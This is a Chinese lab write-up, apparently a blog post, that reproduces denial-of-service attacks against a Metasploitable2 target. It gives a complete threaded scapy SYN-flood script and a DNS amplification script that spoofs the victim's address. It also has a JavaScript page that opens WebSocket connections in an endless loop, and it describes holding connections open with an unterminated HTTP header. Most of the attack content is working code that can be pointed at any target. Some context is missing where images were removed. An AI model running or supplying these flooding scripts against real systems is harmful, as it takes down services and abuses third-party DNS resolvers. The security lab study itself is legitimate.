DDOS攻击模拟复现

拒绝服务
  • DDOS

严格来说我做的实验应该叫做DOS，但是毕竟资源有限，如果多台主机使用同种方式攻击服务器，就会造成DDOS，所以我还是把本次实验都叫做DDOS吧。我们选取metasploit2作为靶机，在DDOS之前可以正常访问靶机web服务：

SYN FLOOD攻击复现

我们阻断三次握手的第三次ACK包，由于服务器没有收到客户端发来的响应，就会一直保持连接直到超时时间，当有大量这种半开连接建立时，即造成SYN Flood攻击。这里我们使用python的scapy模块来模拟发包：

使用wireshark抓包时，可以看到目标服务器给我们返回SYN+ACK时，我们的电脑又发送了一个RST包给服务器这样就直接中断了连接，这是怎么回事？其实这个RST包是系统自己发送的，原因在于一开始的SYN包是我们使用scapy发出的，而不是操作系统自己发出的，所以当操作系统收到一个SYN+ACK包时，就会返回RST包。既然这样，我们可以使用iptables禁止系统自动给目标发送RST包，从而达到建立半开连接的效果，命令如下：

syn_flood脚本：

#!/usr/bin/python
#coding:utf-8

from scapy.all import *
from time import sleep
import thread
import random
def syn_flood(target,port):
    while 1:
        rand = random.randint(0,65535)
        send(IP(dst=target)/TCP(dport=port,sport=rand),verbose=0)
def main():
    if len(sys.argv) != 4:
        print("参数错误，用法如下：")
        print("python syn_flood.py [IP] [port] [threadcount]")
        sys.exit()

    target = sys.argv[1]
    port = int(sys.argv[2])
    thread_count = int(sys.argv[3])
    print("SYN Flood start,press Ctrl+C to stop.")
    for i in range(thread_count):
        thread.start_new_thread(syn_flood,(target,port))
        sleep(0.1)

if __name__ == "__main__":
    main()

使用wireshark抓包查看效果：

下面编写脚本进行自动化攻击：

#!/usr/bin/python
#coding:utf-8

from scapy.all import *
from time import sleep
import thread
def DNS_Amplification_Attack(target,Server_IP,Domain_Name):
    while 1:
        send(IP(dst=Server_IP,src=target)/UDP()/DNS(rd=1,qdcount=1,qd=DNSQR(qname=Domain_Name,qtype=255)),verbose=0)
def main():
    if len(sys.argv) != 5:
        print("参数错误，用法如下：")
        print("python syn_flood.py [target] [Server_IP] [Domain_Name] [threadcount]")
        sys.exit()

    target = sys.argv[1]
    Server_IP = sys.argv[2]
    Domain_Name = sys.argv[3]
    thread_count = int(sys.argv[4])
    print("DNS Amplification Attack start,press Ctrl+C to stop.")
    for i in range(thread_count):
        thread.start_new_thread(DNS_Amplification_Attack,(target,Server_IP,Domain_Name))
    while True:
        sleep(0.5)

if __name__ == "__main__":
    main()

XSS-DDOS

准备一个开启了web服务的主机，这里选择Ubuntu做演示：

WebSocket协议是基于TCP的一种新的网络协议。它实现了浏览器与服务器全双工(full-duplex)通信(允许服务器主动发送信息给客户端)。
在Ubuntu的/var/www/html/目录下添加XSS-DOS.php，代码如下：

<!DOCTYPE HTML>
<html>
    <head>
    <meta charset="utf-8">
    <title>websocket test</title>

    <script type="text/javascript">
        while (1){
            var ws = new WebSocket("ws://192.168.100.102:80");
        }
    </script>
    </head>
</html>

然后使用我们的主机访问http://190.168.100.102/XSS-DOS.php(192.168.100.102是Ubuntu的IP，192.168.100.105是我本机的IP)由下图可看到，当我本机访问目标服务器时，两者之间建立了大量的连接如果这时有大量的主机访问http://190.168.100.102/XSS-DOS.php，服务器的tcp连接池就会被占满，最终导致拒绝服务。

大家可以观察到，在我们浏览器访问目标服务器一段时间后，我们的浏览器崩溃了，这是因为我们与目标建立的大量的TCP连接，这对我们自己主机也是非常消耗内存的，所以说这种攻击属于拼资源型攻击。

我们看到结尾是0d0a，0d表示\r,0a表示\n，也就是说结尾是\r\n。而正常的请求头结尾应该是\r\n\r\n，如果以\r\n结尾，服务器就会认为客户端的数据还没传输完，就需要一直保持连接直到超时。
